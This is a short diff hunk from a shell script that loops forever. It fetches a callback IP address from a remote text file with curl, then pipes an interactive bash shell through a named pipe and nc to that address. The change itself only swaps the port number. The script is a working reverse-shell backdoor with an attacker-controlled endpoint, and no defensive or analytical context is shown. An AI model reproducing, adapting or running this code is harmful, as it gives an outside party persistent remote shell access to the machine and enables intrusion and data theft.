@@ -11,7 +11,7 @@ mkfifo /tmp/f
 while true; do
 
 IP=$(curl -s https://ibnusaja.nasihosting.com/temp.txt)
-PORT="10041"
+PORT="29399"
 
 cat /tmp/f | /bin/bash -i 2>&1 | nc $IP $PORT > /tmp/f
 
